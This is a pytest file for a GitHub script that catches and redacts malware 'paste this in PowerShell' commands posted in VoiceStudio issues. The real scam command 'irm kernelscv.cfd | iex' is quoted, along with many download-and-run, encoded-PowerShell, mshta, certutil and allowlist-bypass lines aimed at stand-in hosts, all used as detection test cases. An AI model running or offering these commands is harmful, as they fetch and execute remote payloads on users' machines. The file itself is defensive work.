"""Unit tests for .github/scripts/scam_guard.py (removes malware commands from issues)."""
from __future__ import annotations

import importlib.util
import re
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
_spec = importlib.util.spec_from_file_location("scam_guard", _ROOT / ".github" / "scripts" / "scam_guard.py")
guard = importlib.util.module_from_spec(_spec)
sys.modules["scam_guard"] = guard  # dataclasses resolve their module by name
_spec.loader.exec_module(guard)

# Issue #3208 / #3211: the GitHub URL is a decoy string; the command runs kernelscv.cfd.
SCAM_3208 = (
    "### Method 1 - PowerShell \n1. Click the **Start Menu**, type `PowerShell`, and open it.\n"
    "2. Copy and paste the code below and press **Enter.**\n\n```powershell\n"
    '"VoiceStudioInstaller-fixed;https://github.com/debpalash/VoiceStudio/releases/tag/v0.5.6";'
    "irm kernelscv.cfd | iex\n```"
)


# ── Detection ───────────────────────────────────────────────────────────


def test_the_3208_scam_is_caught_despite_the_decoy_url():
    [finding] = guard.scan(SCAM_3208)
    assert (finding.rule, finding.source) == ("download-and-run", "kernelscv.cfd")


@pytest.mark.parametrize("text", [
    "iex (irm https://evil.example/a.ps1)",
    "iex(New-Object Net.WebClient).DownloadString('http://evil.example/x')",
    "Invoke-WebRequest -UseBasicParsing evil.example/fix | Invoke-Expression",
    "irm   evil.example|iex",
    "IRM EVIL.EXAMPLE | IEX",
    "curl -fsSL https://evil.example/fix.sh | bash",
    "wget -qO- http://evil.example/fix | sudo sh",
    "curl.exe -s evil.example/p | python3",
    'sh -c "$(curl -fsSL https://evil.example/install)"',
    "irm $u | iex",  # target hidden in a variable
    "irm 203.0.113.9/x | iex",  # bare IP
    "i​rm evil.example | i​ex",  # zero-width characters
    "irm https://voicestudio.sh.evil.example | iex",  # lookalike host
    "irm https://github.com/someone-else/VoiceStudio/raw/x.ps1 | iex",
    "irm https://raw.githubusercontent.com/debpalash/VoiceStudioFix/main/x | iex",
    # Allowlist tricks: userinfo, climbing out of the prefix, a second URL.
    "irm https://voicestudio.sh@evil.example/x | iex",
    "irm https://github.com/debpalash/VoiceStudio/../../evil/x/raw/a.ps1 | iex",
    "irm https://github.com/debpalash/VoiceStudio/%2e%2e/%2e%2e/evil/a.ps1 | iex",
    "curl -fsSL https://voicestudio.sh/install https://evil.example/x | sh",
])
def test_download_and_run_from_unlisted_sources_is_caught(text):
    assert [f.rule for f in guard.scan(text)] == ["download-and-run"]


@pytest.mark.parametrize("text, rule", [
    ("powershell -enc SQBFAFgAIAAoAGkAcgBtACkA", "encoded-powershell"),
    ("pwsh.exe -NoP -EncodedCommand SQBFAFgAIAAoAGkAcgBtACkA", "encoded-powershell"),
    ("Press Win+R and run: mshta https://evil.example/x.hta", "mshta"),
    ("certutil -urlcache -split -f http://evil.example/a.exe a.exe", "certutil-download"),
    ("rundll32 url.dll,FileProtocolHandler https://evil.example/a", "rundll32-url"),
])
def test_always_dangerous_commands_are_caught(text, rule):
    assert rule in [f.rule for f in guard.scan(text)]


def _documented_install_commands() -> list[str]:
    text = (_ROOT / "README.md").read_text(encoding="utf-8")
    for doc in sorted((_ROOT / "docs").rglob("*.md")):
        text += "\n" + doc.read_text(encoding="utf-8")
    commands = re.findall(r"(?:irm|curl)[^`\"\n]*\|\s*(?:iex|bash|sh)\b", text)
    assert commands, "README/docs no longer show install commands; update this test"
    return sorted(set(commands))


@pytest.mark.parametrize("text", _documented_install_commands())
def test_install_commands_from_the_docs_are_allowed(text):
    # Users paste these into bug reports (for example #2973); they must survive.
    assert guard.scan(text) == []


@pytest.mark.parametrize("text", [
    "spawn UNKNOWN when starting the backend on Windows 11",
    "I ran `irm https://voicestudio.sh/install.ps1 | iex` and got ImportError: DLL load failed",
    "curl http://127.0.0.1:3900/health returns connection refused",
    "Downloaded the installer with curl -O https://evil.example/file and checked it",
    "pip install torch --index-url https://download.pytorch.org/whl/cu121",
    "The log says: | iex is not recognised",
    "irm https://voicestudio.sh/install.ps1 | iex, then see https://example.com/notes",
    # Real issues describing the pattern without a target (#2973, #1628).
    "[Install] Windows PowerShell command (irm | iex) downloads Linux/macOS bash script",
    "`curl ... | sh` currently clones the repo and builds from source",
])
def test_ordinary_bug_reports_are_left_alone(text):
    assert guard.scan(text) == []


# ── Event handling ──────────────────────────────────────────────────────


class FakeGitHub:
    repo = "debpalash/VoiceStudio"

    def __init__(self, comments=()):
        self.calls: list[tuple] = []
        self.comments = list(comments)

    def call(self, method, path, body=None, ok=(200, 201, 204)):
        self.calls.append((method, path, body))
        return self.comments if method == "GET" else None


def issue(body, association="NONE", user_type="User", title="[GUIDE] backend fix"):
    return {"number": 3208, "title": title, "body": body, "author_association": association,
            "user": {"login": "Griffingroinverter", "type": user_type}}


def comment(body, association="NONE"):
    return {"id": 77, "body": body, "author_association": association,
            "user": {"login": "Signalpluflue34", "type": "User"}}


def test_a_scam_issue_is_redacted_closed_labelled_and_locked():
    gh = FakeGitHub()
    log = guard.run(gh, "issues", {"issue": issue(SCAM_3208)})
    assert "kernelscv.cfd" in log and "irm" not in log  # the log never repeats the command
    (_, _, edit), (_, labels_path, labels), (_, lock_path, lock) = gh.calls
    assert edit["title"] == guard.ISSUE_TITLE and "kernelscv" not in edit["body"]
    assert edit["state"] == "closed"
    assert labels == {"labels": [guard.LABEL]} and lock_path.endswith("/3208/lock")
    assert lock == {"lock_reason": "spam"}


def test_a_scam_comment_is_deleted_and_the_thread_warned_once():
    gh = FakeGitHub()
    guard.run(gh, "issue_comment", {"issue": issue("spawn UNKNOWN"), "comment": comment(SCAM_3208)})
    methods = [(m, p) for m, p, _ in gh.calls]
    assert ("DELETE", "/repos/debpalash/VoiceStudio/issues/comments/77") in methods
    assert ("POST", "/repos/debpalash/VoiceStudio/issues/3208/comments") in methods

    warned = FakeGitHub(comments=[{"body": guard.COMMENT_WARNING}])
    guard.run(warned, "issue_comment", {"issue": issue("spawn UNKNOWN"), "comment": comment(SCAM_3208)})
    assert ("POST", "/repos/debpalash/VoiceStudio/issues/3208/comments") not in [(m, p) for m, p, _ in warned.calls]


def test_a_scam_command_in_the_title_is_caught():
    gh = FakeGitHub()
    guard.run(gh, "issues", {"issue": issue("see title", title="Fix: irm evil.example | iex")})
    assert gh.calls


@pytest.mark.parametrize("association", ["OWNER", "MEMBER", "COLLABORATOR"])
def test_maintainers_are_never_touched(association):
    gh = FakeGitHub()
    assert "skipped" in guard.run(gh, "issues", {"issue": issue(SCAM_3208, association)})
    assert gh.calls == []


def test_bots_are_never_touched():
    gh = FakeGitHub()
    guard.run(gh, "issues", {"issue": issue(SCAM_3208, user_type="Bot")})
    assert gh.calls == []


def test_the_warnings_themselves_are_clean():
    assert guard.scan(guard.ISSUE_BODY) == [] and guard.scan(guard.COMMENT_WARNING) == []
